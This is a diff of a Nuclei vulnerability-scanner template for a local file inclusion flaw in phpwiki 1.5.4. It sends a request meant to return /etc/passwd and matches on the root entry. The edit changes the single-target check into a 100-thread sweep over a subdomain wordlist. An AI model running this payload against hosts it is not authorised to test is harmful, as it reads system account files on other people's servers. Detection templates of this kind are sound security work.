@@ -1,23 +1,26 @@
 id: phpwiki-lfi
 
 info:
-  name: phpwiki 1.5.4 - Cross-Site Scripting/Local File Inclusion
+  name: phpwiki 1.5.4 - XSS / Local File Inclusion
   author: 0x_Akoko
   severity: high
-  description: phpwiki 1.5.4 is vulnerable to cross-site scripting and local file inclusion, and allows remote unauthenticated attackers to include and return the content of locally stored files via the 'index.php' endpoint.
-  reference:
-    - https://www.exploit-db.com/exploits/38027
-  metadata:
-    max-request: 1
-  tags: xss,edb,phpwiki,lfi
+  reference: https://www.exploit-db.com/exploits/38027
+  tags: phpwiki,lfi
 
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/phpwiki/index.php/passwd"
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /phpwiki/index.php/passwd HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
     matchers-condition: and
     matchers:
+
       - type: regex
         regex:
           - "root:[x*]:0:0"
@@ -25,4 +28,3 @@ http:
       - type: status
         status:
           - 200
-# digest: 4a0a00473045022100b445a911b438bed0c32ce1a18a657590ca280ed7d48ce906290d8b18a3107494022068a127e30f16346e69d499109952bafbd8d1f9763eac0538a425d1515087ce40:922c64590222798bb761d5b6d8e72950
